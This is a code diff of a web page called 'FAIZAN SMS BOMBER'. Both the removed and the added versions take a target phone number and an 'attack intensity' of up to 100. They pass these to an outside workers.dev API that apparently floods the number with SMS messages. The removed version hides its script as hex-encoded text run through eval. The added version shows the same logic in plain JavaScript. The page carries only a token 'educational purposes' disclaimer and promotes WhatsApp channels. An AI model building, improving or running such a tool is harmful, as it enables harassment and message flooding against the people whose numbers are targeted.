@@ -1,22 +1,417 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>FAIZAN SMS BOMBER</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet"><style>:root{--bg-dark:#0a0f0d;--surface-color:#101814;--border-color:#2a3b33;--hacker-green:#00ff41;--hacker-red:#ff004f;--text-color:#e6f1ea;--text-muted:#8c9b92;--font-mono:'Fira Code',monospace;}*{margin:0;padding:0;box-sizing:border-box;}body{font-family:'Poppins',sans-serif;background-color:var(--bg-dark);color:var(--text-color);display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:20px;}.spinner{border:4px solid rgba(0,255,65,0.2);border-top:4px solid var(--hacker-green);border-radius:50%;width:25px;height:25px;animation:spin 1s linear infinite;}@keyframes spin{to{transform:rotate(360deg);}}/* **************************************************************************** * DEVELOPER'S NOTE * **************************************************************************** * * Looking for premium,custom web solutions? * * Services offered:* - Admin Panels with Password Protection * - Custom Shopify Store Setups * - Professional Website Tools & Kits * - Premium Access to APIs * * If you have a project in mind,let's build it together. * Custom setups are paid services. For free resources,please * check the provided channel. * https://whatsapp.com/channel/0029Vb2y2umF6sn16F6Zm20k * Contact for custom projects:+92 302 437 9204 * **************************************************************************** */ .site-header{text-align:center;margin-bottom:30px;}.site-header h1{font-family:var(--font-mono);font-size:2.2rem;font-weight:500;color:var(--hacker-green);margin-bottom:5px;text-shadow:0 0 15px rgba(0,255,65,0.5);}.site-header p{font-family:var(--font-mono);color:var(--text-muted);}.control-panel-container{background-color:var(--surface-color);border-radius:10px;box-shadow:0 10px 30px rgba(0,0,0,0.2);padding:30px 40px;max-width:800px;width:100%;border:1px solid var(--border-color);}.form-controls{display:grid;grid-template-columns:1fr;gap:25px;margin-bottom:25px;}.form-group{position:relative;}.form-group label{display:block;font-family:var(--font-mono);font-weight:500;margin-bottom:10px;color:var(--text-muted);}.form-group input[type="tel"],.form-group input[type="number"]{width:100%;padding:12px 12px 12px 35px;border:1px solid var(--border-color);border-radius:8px;font-family:'Poppins',sans-serif;font-size:1rem;background:var(--bg-dark);color:var(--text-color);transition:all 0.3s;}.form-group::before{content:'>';position:absolute;left:15px;top:43px;font-family:var(--font-mono);color:var(--text-muted);}.form-group input:focus{outline:none;border-color:var(--hacker-green);box-shadow:0 0 8px rgba(0,255,65,0.3);}.intensity-control{display:flex;border-radius:8px;overflow:hidden;border:1px solid var(--border-color);}.intensity-control input[type="radio"]{display:none;}.intensity-control label{flex:1;padding:12px;text-align:center;cursor:pointer;font-family:var(--font-mono);background:var(--bg-dark);color:var(--text-muted);transition:all 0.2s;position:relative;}.intensity-control label:not(:last-child){border-right:1px solid var(--border-color);}.intensity-control input[type="radio"]:checked + label{background:var(--hacker-green);color:var(--bg-dark);font-weight:700;}#trigger-btn{border:1px solid;padding:15px 30px;border-radius:8px;font-size:1.1rem;font-weight:600;cursor:pointer;transition:all 0.3s ease;width:100%;text-transform:uppercase;letter-spacing:1px;margin-top:10px;background-color:var(--hacker-green);border-color:var(--hacker-green);color:var(--bg-dark);}#trigger-btn:hover:not(:disabled){transform:translateY(-3px);box-shadow:0 6px 20px rgba(0,255,65,0.2);}#trigger-btn:disabled{background:var(--text-muted);border-color:var(--text-muted);cursor:not-allowed;opacity:0.5;}.results-area{margin-top:25px;text-align:left;}#system-log-live{font-family:var(--font-mono);font-size:0.9rem;min-height:120px;max-height:250px;overflow-y:auto;border-radius:8px;padding:15px;background-color:var(--bg-dark);border:1px solid var(--border-color);white-space:pre-wrap;word-wrap:break-word;}#system-log-live .log-entry{display:flex;align-items:center;gap:10px;}#system-log-live::-webkit-scrollbar{width:8px;}#system-log-live::-webkit-scrollbar-track{background:var(--bg-dark);}#system-log-live::-webkit-scrollbar-thumb{background:var(--border-color);border-radius:4px;}.result-summary{margin-top:20px;display:flex;justify-content:space-around;text-align:center;font-family:var(--font-mono);padding:15px;background:var(--bg-dark);border:1px solid var(--border-color);border-radius:8px;}.summary-item strong{display:block;font-size:1.5rem;}.summary-item .success{color:var(--hacker-green);}.summary-item .failure{color:var(--hacker-red);}.site-footer{margin-top:40px;text-align:center;color:var(--text-muted);font-size:0.9rem;}.site-footer p{margin-bottom:10px;}.site-footer a{color:var(--hacker-green);text-decoration:none;font-weight:500;}
-/*
-        ****************************************************************************
-        *                             DEVELOPER'S NOTE                             *
-        ****************************************************************************
-        *
-        *   Looking for premium, custom web solutions?
-        *
-        *   Services offered:
-        *   - Admin Panels with Password Protection
-        *   - Custom Shopify Store Setups
-        *   - Professional Website Tools & Kits
-        *   - Premium Access to APIs
-        *
-        *   If you have a project in mind, let's build it together.
-        *   Custom setups are paid services. For free resources, please
-        *   check the provided channel.
-        *   https://whatsapp.com/channel/0029Vb2y2umF6sn16F6Zm20k
-        *   Contact for custom projects: +92 302 437 9204
-        *
-        ****************************************************************************
-        */</style></head><body><header class="site-header"><h1>FAIZAN SMS BOMBER</h1><p>// ANONYMOUS TRANSMISSION PROTOCOL</p></header><main class="control-panel-container"><div class="form-controls"><div class="form-group"><label for="recipient-number">TARGET_NODE [Phone Number]</label><input type="tel" id="recipient-number" placeholder="e.g., 923xxxxxxxxx"></div><div class="form-group"><label>ATTACK_INTENSITY</label><div class="intensity-control" id="intensity-selector"><input type="radio" id="intensity-low" name="intensity" value="10" checked><label for="intensity-low">Low (10)</label><input type="radio" id="intensity-normal" name="intensity" value="25"><label for="intensity-normal">Normal (25)</label><input type="radio" id="intensity-high" name="intensity" value="50"><label for="intensity-high">High (50)</label><input type="radio" id="intensity-extreme" name="intensity" value="100"><label for="intensity-extreme">Extreme (100)</label></div></div></div><button id="trigger-btn">INITIATE ATTACK</button><div class="results-area"><label>SYSTEM_LOG</label><div id="system-log-live"></div></div></main><footer class="site-footer"><p>© 2025 Faizan Ahmad  All Rights Reserved.</p><p>Disclaimer: This tool is for educational purposes only. Use responsibly.</p><p><a href="" target="_blank">MUHAMMAD FAIZAN AHMED</a></p></footer><script>(function(_0x6150d2){var _0xce8c07='';for(var i=0;i<_0x6150d2.length;i+=2){_0xce8c07+=String.fromCharCode(parseInt(_0x6150d2.substr(i,2),16));}eval(_0xce8c07);}('0a20202020636f6e737420534d534d6174726978203d207b0a2020202020202020696e69742829207b0a202020202020202020202020746869732e7569203d207b0a20202020202020202020202020202020726563697069656e74496e7075743a20646f63756d656e742e676574456c656d656e74427949642827726563697069656e742d6e756d62657227292c0a202020202020202020202020202020207472696767657242746e3a20646f63756d656e742e676574456c656d656e74427949642827747269676765722d62746e27292c0a2020202020202020202020202020202073797374656d4c6f673a20646f63756d656e742e676574456c656d656e7442794964282773797374656d2d6c6f672d6c69766527292c0a2020202020202020202020207d3b0a202020202020202020202020746869732e4150495f424153455f55524c203d202768747470733a2f2f66616b2d736d732d626f6f6d6265722e6a6f6b65726b6565703035372e776f726b6572732e6465762f273b0a202020202020202020202020746869732e4150495f4b4559203d20273332353633273b0a2020202020202020202020200a202020202020202020202020746869732e73657475704576656e744c697374656e65727328293b0a202020202020202020202020746869732e6c6f674d657373616765282753595354454d204c4f473a205374616e6462792e204177616974696e67207573657220696e7075742e2e2e27293b0a20202020202020207d2c0a0a202020202020202073657475704576656e744c697374656e6572732829207b0a202020202020202020202020746869732e75692e7472696767657242746e2e6164644576656e744c697374656e65722827636c69636b272c202829203d3e20746869732e737461727450726f636573732829293b0a20202020202020207d2c0a0a20202020202020206c6f674d65737361676528746578742c2074797065203d2027494e464f2729207b0a202020202020202020202020636f6e737420656e747279203d20646f63756d656e742e637265617465456c656d656e74282764697627293b0a202020202020202020202020656e7472792e636c6173734e616d65203d20276c6f672d656e747279273b0a2020202020202020202020206c657420636f6c6f72203d2027766172282d2d746578742d6d7574656429273b0a2020202020202020202020206966202874797065203d3d3d202753554343455353272920636f6c6f72203d2027766172282d2d6861636b65722d677265656e29273b0a2020202020202020202020206966202874797065203d3d3d20274552524f52272920636f6c6f72203d2027766172282d2d6861636b65722d72656429273b0a202020202020202020202020656e7472792e7374796c652e636f6c6f72203d20636f6c6f723b0a202020202020202020202020656e7472792e74657874436f6e74656e74203d20603e20247b747970657d3a20247b746578747d603b0a202020202020202020202020746869732e75692e73797374656d4c6f672e617070656e644368696c6428656e747279293b0a202020202020202020202020746869732e75692e73797374656d4c6f672e7363726f6c6c546f70203d20746869732e75692e73797374656d4c6f672e7363726f6c6c4865696768743b0a20202020202020207d2c0a20202020202020200a2020202020202020736574427574746f6e53746174652869734c6f6164696e6729207b0a202020202020202020202020746869732e75692e7472696767657242746e2e64697361626c6564203d2069734c6f6164696e673b0a202020202020202020202020746869732e75692e7472696767657242746e2e696e6e657248544d4c203d2069734c6f6164696e67203f20273c64697620636c6173733d227370696e6e657222207374796c653d226d617267696e3a2030206175746f3b223e3c2f6469763e27203a2027494e4954494154452041545441434b273b0a20202020202020207d2c0a0a2020202020202020646973706c617953756d6d617279286461746129207b0a202020202020202020202020636f6e73742073756d6d617279446976203d20646f63756d656e742e637265617465456c656d656e74282764697627293b0a20202020202020202020202073756d6d6172794469762e636c6173734e616d65203d2027726573756c742d73756d6d617279273b0a20202020202020202020202073756d6d6172794469762e696e6e657248544d4c203d20600a202020202020202020202020202020203c64697620636c6173733d2273756d6d6172792d6974656d223e0a20202020202020202020202020202020202020203c7374726f6e6720636c6173733d2273756363657373223e247b646174612e73756363657373436f756e747d3c2f7374726f6e673e0a20202020202020202020202020202020202020203c7370616e3e535543434553533c2f7370616e3e0a202020202020202020202020202020203c2f6469763e0a202020202020202020202020202020203c64697620636c6173733d2273756d6d6172792d6974656d223e0a20202020202020202020202020202020202020203c7374726f6e6720636c6173733d226661696c757265223e247b646174612e6661696c757265436f756e747d3c2f7374726f6e673e0a20202020202020202020202020202020202020203c7370616e3e4641494c5552453c2f7370616e3e0a202020202020202020202020202020203c2f6469763e0a202020202020202020202020202020203c64697620636c6173733d2273756d6d6172792d6974656d223e0a20202020202020202020202020202020202020203c7374726f6e673e247b646174612e746f74616c52657175657374737d3c2f7374726f6e673e0a20202020202020202020202020202020202020203c7370616e3e544f54414c3c2f7370616e3e0a202020202020202020202020202020203c2f6469763e0a202020202020202020202020603b0a202020202020202020202020746869732e75692e73797374656d4c6f672e617070656e644368696c642873756d6d617279446976293b0a20202020202020207d2c0a0a20202020202020206173796e6320737461727450726f636573732829207b0a202020202020202020202020636f6e737420726563697069656e744e756d626572203d20746869732e75692e726563697069656e74496e7075742e76616c75652e7472696d28293b0a202020202020202020202020636f6e737420636f756e74203d20646f63756d656e742e717565727953656c6563746f722827696e7075745b6e616d653d22696e74656e73697479225d3a636865636b656427292e76616c75653b0a0a2020202020202020202020206966202821726563697069656e744e756d626572207c7c20212f5e5c647b31302c31347d242f2e7465737428726563697069656e744e756d6265722929207b0a20202020202020202020202020202020746869732e6c6f674d6573736167652827496e76616c696420546172676574204e6f6465202831302d313420646967697473207265717569726564292e272c20274552524f5227293b0a2020202020202020202020202020202072657475726e3b0a2020202020202020202020207d0a0a202020202020202020202020746869732e736574427574746f6e53746174652874727565293b0a202020202020202020202020746869732e75692e73797374656d4c6f672e696e6e657248544d4c203d2027273b0a202020202020202020202020746869732e6c6f674d6573736167652860496e697469616c697a696e672061747461636b206f6e206e6f646520247b726563697069656e744e756d6265727d207769746820247b636f756e747d207061636b6574732e2e2e60293b0a202020202020202020202020746869732e6c6f674d657373616765282754686973206d61792074616b652061206d6f6d656e742e2054686520776f726b65722069732070726f63657373696e6720616c6c2072657175657374732e27293b0a2020202020202020202020200a202020202020202020202020747279207b0a20202020202020202020202020202020636f6e73742061706955726c203d2060247b746869732e4150495f424153455f55524c7d3f6b65793d247b746869732e4150495f4b45597d266e756d6265723d247b726563697069656e744e756d6265727d26636f756e743d247b636f756e747d603b0a20202020202020202020202020202020636f6e737420726573706f6e7365203d2061776169742066657463682861706955726c293b0a20202020202020202020202020202020636f6e73742064617461203d20617761697420726573706f6e73652e6a736f6e28293b0a0a202020202020202020202020202020206966202821726573706f6e73652e6f6b207c7c2021646174612e7375636365737329207b0a20202020202020202020202020202020202020207468726f77206e6577204572726f7228646174612e6572726f72207c7c2027546865204150492072657475726e656420616e20756e6578706563746564206572726f722e27293b0a202020202020202020202020202020207d0a202020202020202020202020202020200a20202020202020202020202020202020746869732e6c6f674d6573736167652860416c6c20247b646174612e746f74616c52657175657374737d207061636b657473207472616e736d69747465642e20416e616c797a696e6720726573756c74732e2e2e602c20275355434345535327293b0a20202020202020202020202020202020746869732e646973706c617953756d6d6172792864617461293b0a0a2020202020202020202020207d20636174636820286572726f7229207b0a20202020202020202020202020202020636f6e736f6c652e6572726f722822415049204572726f723a222c206572726f72293b0a20202020202020202020202020202020746869732e6c6f674d65737361676528604120637269746963616c206572726f72206f636375727265643a20247b6572726f722e6d6573736167657d602c20274552524f5227293b0a2020202020202020202020207d2066696e616c6c79207b0a20202020202020202020202020202020746869732e736574427574746f6e53746174652866616c7365293b0a2020202020202020202020207d0a20202020202020207d0a202020207d3b0a0a20202020646f63756d656e742e6164644576656e744c697374656e65722827444f4d436f6e74656e744c6f61646564272c202829203d3e20534d534d61747269782e696e69742829293b0a'));</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FAIZAN SMS BOMBER // BLUE_PROTOCOL</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #02040a;
+            --surface-color: rgba(10, 20, 40, 0.7);
+            --border-color: #1e3a8a;
+            --neon-blue: #00f3ff;
+            --deep-blue: #2979ff;
+            --alert-red: #ff2a6d;
+            --text-main: #e0f2fe;
+            --text-muted: #94a3b8;
+            --font-tech: 'Fira Code', monospace;
+            --font-display: 'Rajdhani', sans-serif;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: var(--font-display);
+            background-color: var(--bg-dark);
+            /* Moving Grid Background */
+            background-image: 
+                linear-gradient(rgba(0, 243, 255, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 243, 255, 0.05) 1px, transparent 1px);
+            background-size: 40px 40px;
+            animation: moveGrid 20s linear infinite;
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        @keyframes moveGrid {
+            0% { background-position: 0 0; }
+            100% { background-position: 40px 40px; }
+        }
+
+        /* HEADER & LOGO */
+        .site-header {
+            text-align: center;
+            margin-bottom: 35px;
+            margin-top: 30px;
+            position: relative;
+        }
+
+        .logo-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 20px;
+        }
+
+        .logo-img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--neon-blue);
+            box-shadow: 0 0 30px rgba(0, 243, 255, 0.3);
+            position: relative;
+            z-index: 2;
+        }
+
+        /* Rotating Ring Animation */
+        .logo-ring {
+            position: absolute;
+            top: -10px; left: -10px; right: -10px; bottom: -10px;
+            border: 2px dashed var(--deep-blue);
+            border-radius: 50%;
+            animation: rotateRing 10s linear infinite;
+            z-index: 1;
+        }
+
+        @keyframes rotateRing { to { transform: rotate(360deg); } }
+
+        .site-header h1 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            background: linear-gradient(to right, #fff, var(--neon-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 5px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: rgba(0, 243, 255, 0.1);
+            border: 1px solid var(--neon-blue);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            color: var(--neon-blue);
+            font-family: var(--font-tech);
+            box-shadow: 0 0 10px rgba(0, 243, 255, 0.2);
+        }
+
+        /* MAIN PANEL */
+        .control-panel-container {
+            background: var(--surface-color);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border-radius: 20px;
+            border: 1px solid rgba(0, 243, 255, 0.15);
+            box-shadow: 0 0 40px rgba(0, 0, 0, 0.6);
+            padding: 40px;
+            max-width: 550px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Top Blue Bar */
+        .control-panel-container::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 3px;
+            background: linear-gradient(90deg, var(--deep-blue), var(--neon-blue), var(--deep-blue));
+            box-shadow: 0 0 15px var(--neon-blue);
+        }
+
+        .form-group { margin-bottom: 25px; }
+
+        .form-group label {
+            display: block;
+            font-family: var(--font-tech);
+            color: var(--neon-blue);
+            font-size: 0.85rem;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .form-group input[type="tel"] {
+            width: 100%;
+            padding: 16px 20px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            color: #fff;
+            font-family: var(--font-tech);
+            font-size: 1.1rem;
+            transition: 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--neon-blue);
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.15);
+            background: rgba(0, 243, 255, 0.02);
+        }
+
+        /* Intensity Selector */
+        .intensity-control {
+            display: flex;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 12px;
+            padding: 5px;
+            border: 1px solid var(--border-color);
+        }
+
+        .intensity-control label {
+            flex: 1;
+            text-align: center;
+            padding: 10px;
+            margin-bottom: 0;
+            cursor: pointer;
+            border-radius: 8px;
+            color: var(--text-muted);
+            transition: 0.3s;
+            font-size: 0.9rem;
+        }
+
+        .intensity-control input[type="radio"] { display: none; }
+
+        .intensity-control input:checked + label {
+            background: linear-gradient(135deg, var(--deep-blue), var(--neon-blue));
+            color: #000;
+            font-weight: 700;
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.4);
+        }
+
+        /* MAIN ACTION BUTTON */
+        #trigger-btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(90deg, #0061ff, #60efff);
+            color: #000;
+            font-family: var(--font-display);
+            font-size: 1.2rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            margin-top: 10px;
+        }
+
+        #trigger-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px rgba(0, 243, 255, 0.5);
+        }
+
+        #trigger-btn:disabled {
+            background: #1e293b;
+            color: #64748b;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        /* LOGS AREA */
+        .results-area { margin-top: 30px; }
+
+        #system-log-live {
+            background: #050b14;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            height: 200px;
+            overflow-y: auto;
+            font-family: var(--font-tech);
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.8);
+        }
+
+        .log-entry { margin-bottom: 8px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 4px; }
+        .text-blue { color: var(--neon-blue); }
+        .text-red { color: var(--alert-red); }
+
+        /* Custom Scrollbar */
+        #system-log-live::-webkit-scrollbar { width: 6px; }
+        #system-log-live::-webkit-scrollbar-thumb { background: var(--deep-blue); border-radius: 3px; }
+
+        .site-footer {
+            margin-top: 40px;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            text-align: center;
+            opacity: 0.8;
+            padding-bottom: 20px;
+        }
+
+        /* Whatsapp Button Style */
+        .wa-btn {
+            display: inline-block;
+            margin-top: 15px;
+            padding: 12px 25px;
+            background: transparent;
+            border: 1px solid var(--neon-blue);
+            color: var(--neon-blue);
+            text-decoration: none;
+            border-radius: 50px;
+            font-family: var(--font-tech);
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 0 10px rgba(0, 243, 255, 0.1);
+        }
+
+        .wa-btn:hover {
+            background: rgba(0, 243, 255, 0.1);
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.4);
+            transform: translateY(-2px);
+            color: #fff;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            width: 20px; height: 20px;
+            border: 3px solid rgba(0,0,0,0.3);
+            border-top-color: #000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+    </style>
+</head>
+<body>
+
+    <header class="site-header">
+        <div class="logo-container">
+            <div class="logo-ring"></div>
+            <img src="https://i.supaimg.com/bf5a170e-e362-4492-b3bb-c212a003afa0.jpg" alt="FAIZAN SMS BOMBER" class="logo-img">
+        </div>
+        <h1>FAIZAN SMS BOMBER</h1>
+        <div class="status-badge">● SYSTEM V5.0 ONLINE</div>
+    </header>
+
+    <main class="control-panel-container">
+        <div class="form-group">
+            <label>TARGET PHONE NUMBER</label>
+            <div class="input-wrapper">
+                <input type="tel" id="recipient-number" placeholder="Enter number (e.g. 923xxxxxxxxx)">
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>ATTACK INTENSITY</label>
+            <div class="intensity-control">
+                <input type="radio" id="lvl1" name="intensity" value="10" checked>
+                <label for="lvl1">LOW</label>
+
+                <input type="radio" id="lvl2" name="intensity" value="25">
+                <label for="lvl2">MED</label>
+
+                <input type="radio" id="lvl3" name="intensity" value="50">
+                <label for="lvl3">HIGH</label>
+
+                <input type="radio" id="lvl4" name="intensity" value="100">
+                <label for="lvl4">MAX</label>
+            </div>
+        </div>
+
+        <button id="trigger-btn">START OPERATION</button>
+
+        <div class="results-area">
+            <label style="font-family: var(--font-tech); color: var(--neon-blue); font-size: 0.8rem; margin-bottom: 5px; display: block;">LIVE TERMINAL LOG</label>
+            <div id="system-log-live">
+                <div class="log-entry">> System Initialized...</div>
+                <div class="log-entry">> Waiting for user input...</div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="site-footer">
+        <p>© 2025 Tech With Nizami Security</p>
+        <p style="font-size: 0.75rem; margin-top: 5px;">Created for Educational Purpose Only.</p>
+        
+        <a href="https://whatsapp.com/channel/0029VbAPgH78PgsENxv1Ej43" target="_blank" class="wa-btn">
+            JOIN OFFICIAL CHANNEL
+        </a>
+    </footer>
+
+    <script>
+        const API_CONFIG = {
+            url: 'https://fak-sms-boomber.jokerkeep057.workers.dev/',
+            key: '32563'
+        };
+
+        const ui = {
+            btn: document.getElementById('trigger-btn'),
+            input: document.getElementById('recipient-number'),
+            log: document.getElementById('system-log-live'),
+            intensity: () => document.querySelector('input[name="intensity"]:checked').value
+        };
+
+        function addLog(msg, type = 'normal') {
+            const div = document.createElement('div');
+            div.className = 'log-entry';
+            
+            const time = new Date().toLocaleTimeString('en-US', {hour12: false, hour: "numeric", minute: "numeric", second: "numeric"});
+            let colorClass = '';
+            if(type === 'success') colorClass = 'text-blue';
+            if(type === 'error') colorClass = 'text-red';
+
+            div.innerHTML = `<span style="opacity:0.5">[${time}]</span> <span class="${colorClass}">${msg}</span>`;
+            ui.log.appendChild(div);
+            ui.log.scrollTop = ui.log.scrollHeight;
+        }
+
+        ui.btn.addEventListener('click', async () => {
+            const number = ui.input.value.trim();
+            const count = ui.intensity();
+
+            if (!number || number.length < 10) {
+                addLog("Error: Invalid Number Format", 'error');
+                return;
+            }
+
+            ui.btn.disabled = true;
+            ui.btn.innerHTML = '<div class="spinner"></div> PROCESSING...';
+            addLog(`Target locked: ${number}`, 'success');
+            addLog(`Initiating sequence with ${count} packets...`);
+
+            try {
+                const requestUrl = `${API_CONFIG.url}?key=${API_CONFIG.key}&number=${number}&count=${count}`;
+                const response = await fetch(requestUrl);
+                const data = await response.json();
+
+                if (data.success || response.ok) {
+                    addLog("Status: OPERATION SUCCESSFUL", 'success');
+                    addLog(`Server Response: ${JSON.stringify(data)}`, 'success');
+                } else {
+                    throw new Error(data.error || 'Unknown API Error');
+                }
+            } catch (err) {
+                console.error(err);
+                addLog("Status: CONNECTION FAILED", 'error');
+                addLog(`Reason: ${err.message}`, 'error');
+            } finally {
+                ui.btn.disabled = false;
+                ui.btn.innerText = 'START OPERATION';
+            }
+        });
+    </script>
+</body>
+</html>
